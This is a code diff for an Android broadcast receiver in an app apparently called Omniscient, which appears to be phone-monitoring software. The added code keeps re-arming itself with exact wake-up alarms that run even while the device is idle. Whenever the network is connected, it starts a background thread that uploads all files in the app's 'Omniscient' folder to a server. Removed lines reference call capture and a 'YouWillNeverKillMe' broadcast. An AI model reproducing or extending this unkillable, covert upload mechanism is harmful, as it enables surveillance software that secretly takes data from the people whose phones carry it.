@@ -1,114 +1,109 @@
 package com.postal.omniscient.postal.service;
-
-import android.app.ActivityManager;
-import android.app.Notification;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
-import android.os.Looper;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.os.Build;
 import android.support.v4.content.AsyncTaskLoader;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.postal.omniscient.MainActivity;
 import com.postal.omniscient.postal.ThreadIsAliveOrNot;
-import com.postal.omniscient.postal.adapter.EventBusCall;
-import com.postal.omniscient.postal.catchPhone.Call.PhoneCall;
+import com.postal.omniscient.postal.downloadFiles.DownloadFileRun;
 
-import org.greenrobot.eventbus.EventBus;
-import org.greenrobot.eventbus.Subscribe;
-import org.greenrobot.eventbus.ThreadMode;
+import java.io.File;
+
 
 /**
  * Created by Alexandr on 12.05.2016.
  */
-public class RestartServiceReceiver extends BroadcastReceiver
-{
-
-    private static final String TAG = "RestartServiceReceiver";
-    private static final String APP_PREFERENCES_NAME = "MY_PREFERENCES";
-    private static final String PREFERENCES_KEY_IS_CALL = "call";
-    private static final String IS_CALL_NO = "noCall";
-    private SharedPreferences mSettings = null;
-
-
+public class RestartServiceReceiver extends BroadcastReceiver {
+    final int SDK_INT = Build.VERSION.SDK_INT;
+    private static String Msg = "MyMsg";
+    private Boolean start_or_no;
     @Override
     public void onReceive(Context context, Intent intent) {
 
-
-        Log.i("MyMsg", " Receive Start");
         long sec = 1000 * 2;
-        AsyncR ad = new AsyncR(context);
-
-        mSettings = context.getSharedPreferences(APP_PREFERENCES_NAME, Context.MODE_PRIVATE);
-        String IS_CALL = mSettings.getString(PREFERENCES_KEY_IS_CALL, "");
-
 
         try {
-            Thread.sleep(sec);// ВРЕМЯ СНА ЦЫКЛА ВКЛЮЧИТЬ 1 ЧАС
-//            if(IS_CALL.equals(IS_CALL_NO)) {
-                context.sendBroadcast(new Intent("YouWillNeverKillMe"));
-//            }
-                //ad.forceLoad();
+            Thread.sleep(sec);// ВРЕМЯ СНА ЦЫКЛА
+            AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
+            Intent myIntent = new Intent(context, RestartServiceReceiver.class);
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
 
-                   // ad = null;
-
-        } catch (Exception e) {
-            Log.e("MyMsg","1"+ e.toString());
-        }
-
-//        Log.i("MyMsg", " Resiver END");
-
-        //context.startService(new Intent(context.getApplicationContext(), MyService.class));
-
-
-
-//            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-//            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-//                if (MyService.class.getName().equals(service.service.getClassName())) {
-//                    Log.i("MyMsg", "рабочий");
-//                }
-//                Log.i("MyMsg", " не ребочий");
-//
-//        }
-    }
-
-    public class AsyncR extends AsyncTaskLoader {
-
-
-        public AsyncR(Context context) {
-            super(context);
-
-        }
-        Toast toast;
-        public AsyncR(Context applicationContext, Toast toast) {
-            super(applicationContext);
-            this.toast = toast;
-        }
-
-
-        @Override
-        public Object loadInBackground() {
-
-            long sec = 1000 * 20;
-            try {
-               // while(true) {
-                    //Thread.sleep(sec);
-
-//                    Log.i("MyMsg", " Resiver TASC START");
-                //}
-            } catch (Exception e) {
-                Log.e("MyMsg","2"+ e.toString());
+            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
+            }
+            else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
+            }
+            else if (SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
             }
 
-            Intent par = new Intent(getContext(), MyService.class);
+            start_or_no = true;
+            start_or_no = new ThreadIsAliveOrNot("TreadConnect").liveORnot();//проверка работы потока коннекта
 
-            getContext().startService(par);
-            //getContext().sendBroadcast(new Intent("YouWillNeverKillMe"));
+            final ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+            final NetworkInfo ni = connectivityManager.getActiveNetworkInfo();
+
+            if (!start_or_no) {
+                if (ni != null && ni.isConnected()) {// включен ли интернет
+                    if (!start_or_no) {//если поток не работает
+                        startTransferFile(context, intent);// Начать загрузку файлов на сервер при появлении интернета
+                        //если она уже не идет и существует конект с сервером
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(Msg,"Error RestartServiceReceiver onRecive "+ e.toString());
+        }
+
+    }
+
+    /**  получаем пути к файлам для отправки на сервер     */
+    private  File[] getAllFoldersFiles (Context context){
+        File[] files_all = null; //массив папок в которых храняться файлы для отправки
+        File path; //путь к папке программы
+        File f; //путь к папке где сохраняются все файлы для отправки на сервер
+        try{
+            //записать в массив и передать на отправку
+            path = context.getFilesDir();
+            f = new File(String.valueOf(path+"/Omniscient"));
+            files_all = f.listFiles();
+        }catch (Exception e){Log.i("MyMsg","Error RestartServiceReceiver getAllFoldersFiles "+e);}
+        return files_all;
+
+    }
+    //создаем объект для запуска потока загрузки файлов TreadConnect
+    private void startTransferFile(Context context, Intent intent){
+        try{
+            DownloadFileRun downloadFile = new DownloadFileRun(getAllFoldersFiles(context), context, intent);
+            Transfer ad = new Transfer(context, downloadFile);
+            ad.forceLoad();
+        }catch (Exception e){Log.i("MyMsg","Error RestartServiceReceiver startTransferFile "+e);}
+    }
+
+    public class Transfer extends AsyncTaskLoader {
+
+        private DownloadFileRun downloadFile;
+
+        public Transfer (Context context, DownloadFileRun downloadFile) {
+            super(context);
+            this.downloadFile = downloadFile;
+
+        }
+        @Override
+        public Object loadInBackground() {
+            try{
+                Thread startDownload = new Thread(downloadFile, "TreadConnect");
+                //запускаем поток для загрузки файлов на сервер
+                startDownload.start();
+            }catch (Exception e){Log.i("MyMsg","Error RestartServiceReceiver, Transfer loadInBackground "+e);}
             return null;
         }
     }
-
-
 }
